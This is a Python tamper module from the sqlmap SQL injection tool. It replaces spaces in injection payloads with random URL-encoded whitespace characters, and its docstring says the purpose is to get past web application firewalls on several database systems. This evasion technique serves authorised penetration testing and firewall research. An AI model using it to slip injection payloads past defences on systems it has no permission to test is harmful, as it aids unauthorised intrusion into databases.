#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2011 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload):
    """
    Replaces space character (' ') with a random blank character from a
    valid set of alternate characters

    Example:
        * Input: SELECT id FROM users
        * Output: SELECT\rid\tFROM\nusers

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass several web application firewalls
    """

    # ASCII table:
    #   \t      09      horizontal TAB
    #   \n      0A      new line
    #   -       0C      new page
    #   \r      0D      carriage return
    blanks = ['%09', '%0A', '%0C', '%0D']
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += random.choice(blanks)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i]==" " and not doublequote and not quote:
                retVal += random.choice(blanks)
                continue

            retVal += payload[i]

    return retVal
